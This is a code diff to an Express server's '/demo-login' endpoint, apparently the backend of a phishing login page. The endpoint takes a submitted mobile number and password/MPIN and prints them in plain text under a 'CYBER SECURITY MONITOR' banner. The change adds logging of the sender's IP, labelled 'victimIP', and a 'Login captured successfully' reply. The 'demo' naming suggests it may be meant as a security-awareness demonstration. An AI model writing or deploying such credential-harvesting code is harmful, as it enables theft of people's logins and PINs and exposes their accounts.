@@ -8,23 +8,21 @@ async function startServer() {
 
   app.use(cors());
   app.use(express.json());
-
 app.post("/demo-login", (req, res) => {
-  const { mobileNumber, password, rememberMe } = req.body; // <-- match React
+  const { mobileNumber, password, rememberMe } = req.body;
+  
+  // Get the IP address
+  const victimIP = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   console.clear();
-
   console.log(chalk.green("==================================="));
-  console.log(chalk.green("   CYBER SECURITY MONITOR v1.0"));
+  console.log(chalk.green("    CYBER SECURITY MONITOR v1.0"));
   console.log(chalk.green("==================================="));
-
-  console.log(chalk.yellow("Intercepted credential packet..."));
+  console.log(chalk.yellow(`Intercepting packet from: ${victimIP}`)); // Display IP
   console.log("");
-
-  console.log(chalk.red("MOBILE NUMBER:"), chalk.white(mobileNumber)); // <-- mobileNumber
-  console.log(chalk.red("PASSWORD/MPIN:"), chalk.white(password));
+  console.log(chalk.red("MOBILE NUMBER:"), chalk.white(mobileNumber || "MISSING"));
+  console.log(chalk.red("PASSWORD/MPIN:"), chalk.white(password || "MISSING"));
   console.log(chalk.red("REMEMBER ME:"), chalk.white(rememberMe));
-
   console.log(chalk.green("[STATUS] Capture complete"));
 
   res.json({ message: "Login captured successfully" });
